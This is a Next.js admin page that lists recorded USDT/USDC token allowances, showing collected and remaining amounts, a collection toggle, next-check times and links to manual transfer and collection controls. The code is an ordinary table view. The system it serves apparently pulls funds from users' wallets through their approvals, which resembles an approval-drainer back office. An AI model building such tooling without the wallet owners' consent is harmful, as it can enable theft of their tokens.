import Link from "next/link";
import { ErrorAlert } from "@/components/ErrorAlert";
import { FilterForm } from "@/components/FilterForm";
import { PageHeader } from "@/components/PageHeader";
import { Pagination } from "@/components/Pagination";
import { StatusBadge } from "@/components/StatusBadge";
import { Card, CardContent } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { adminGetData, buildQuery } from "@/lib/admin-data";
import { formatDate, shortAddress } from "@/lib/format";

type Approval = {
  id: string;
  ownerAddress: string;
  network: string;
  tokenSymbol: string;
  status: string;
  collectedRaw: string;
  remainingRaw: string;
  collectionEnabled: boolean;
  nextCheckAt: string | null;
  lastError: string | null;
  createdAt: string;
};

type ListResponse = {
  items: Approval[];
  total: number;
  page: number;
  limit: number;
  totalPages: number;
};

export default async function ApprovalsPage({
  searchParams,
}: {
  searchParams: Promise<Record<string, string | undefined>>;
}) {
  const sp = await searchParams;
  const query = buildQuery({
    page: sp.page ?? "1",
    limit: sp.limit ?? "25",
    network: sp.network,
    status: sp.status,
    owner: sp.owner,
    collectionEnabled: sp.collectionEnabled,
  });

  let data: ListResponse;
  try {
    data = await adminGetData<ListResponse>(`/admin/approvals${query}`);
  } catch (err) {
    return (
      <div className="space-y-4">
        <PageHeader
          title="Approvals"
          tip="All token allowances recorded after users approve USDT/USDC (and similar). Filter by network, status, or owner; open a row for manual transfer and collection controls."
        />
        <ErrorAlert message={err instanceof Error ? err.message : "Failed to load"} />
      </div>
    );
  }

  return (
    <div className="space-y-2">
      <PageHeader
          title="Approvals"
          tip="All token allowances recorded after users approve USDT/USDC (and similar). Filter by network, status, or owner; open a row for manual transfer and collection controls."
        />

      <FilterForm
        action="/approvals"
        values={sp}
        fields={[
          { name: "network", label: "Network" },
          { name: "owner", label: "Owner" },
          {
            name: "status",
            label: "Status",
            options: [
              "SUBMITTED",
              "ACTIVE",
              "PARTIALLY_USED",
              "COMPLETED",
              "REVOKED",
              "EXPIRED",
              "FAILED",
            ],
          },
          {
            name: "collectionEnabled",
            label: "Collection",
            options: ["true", "false"],
          },
        ]}
      />

      <Card className="shadow-sm">
        <CardContent className="p-0">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Network</TableHead>
                <TableHead>Token</TableHead>
                <TableHead>Owner</TableHead>
                <TableHead>Status</TableHead>
                <TableHead>Collected</TableHead>
                <TableHead>Next check</TableHead>
                <TableHead>Created</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {data.items.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={7} className="h-24 text-center text-muted-foreground">
                    No approvals found
                  </TableCell>
                </TableRow>
              ) : (
                data.items.map((row) => (
                  <TableRow key={row.id}>
                    <TableCell className="font-medium uppercase">{row.network}</TableCell>
                    <TableCell>{row.tokenSymbol}</TableCell>
                    <TableCell className="font-mono text-xs">
                      <Link
                        href={`/wallets/${encodeURIComponent(row.ownerAddress)}`}
                        className="text-primary hover:underline"
                      >
                        {shortAddress(row.ownerAddress)}
                      </Link>
                    </TableCell>
                    <TableCell>
                      <StatusBadge value={row.status} />
                    </TableCell>
                    <TableCell className="text-xs text-muted-foreground">
                      {row.collectedRaw} / rem {row.remainingRaw}
                    </TableCell>
                    <TableCell className="text-xs text-muted-foreground">
                      {formatDate(row.nextCheckAt)}
                    </TableCell>
                    <TableCell>
                      <Link
                        href={`/approvals/${row.id}`}
                        className="text-sm text-primary hover:underline"
                      >
                        {formatDate(row.createdAt)}
                      </Link>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>

      <Pagination
        page={data.page}
        totalPages={data.totalPages}
        basePath="/approvals"
        query={sp}
      />
    </div>
  );
}
